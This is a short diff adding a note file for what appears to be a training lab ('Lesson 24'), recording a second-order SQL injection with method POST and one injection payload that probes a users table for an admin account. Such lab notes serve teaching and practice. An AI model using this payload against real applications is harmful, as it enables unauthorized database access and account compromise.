@@ -1,0 +1,6 @@
+SURGICAL FLUSH FOR LESSON 24
+==============================
+VULN TYPE: Second-Order
+METHOD: POST
+PAYLOAD: ' AND (SELECT 1 FROM users WHERE username='admin' LIMIT 0,1)-- -
+
